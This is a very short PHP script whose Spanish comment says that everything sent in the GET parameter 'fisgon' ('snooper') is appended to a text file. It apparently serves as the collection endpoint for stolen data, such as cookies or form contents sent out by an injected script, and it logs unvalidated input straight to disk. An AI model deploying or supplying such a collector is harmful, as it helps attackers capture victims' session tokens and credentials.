<?php

#   Todo lo que llegue por medio del parámetro get fisgon se guardará en el txt.
    $data = $_GET["fisgon"];
	$file = fopen('fisgon.txt', 'a');
    fwrite($file, $data . "\n\n");

?>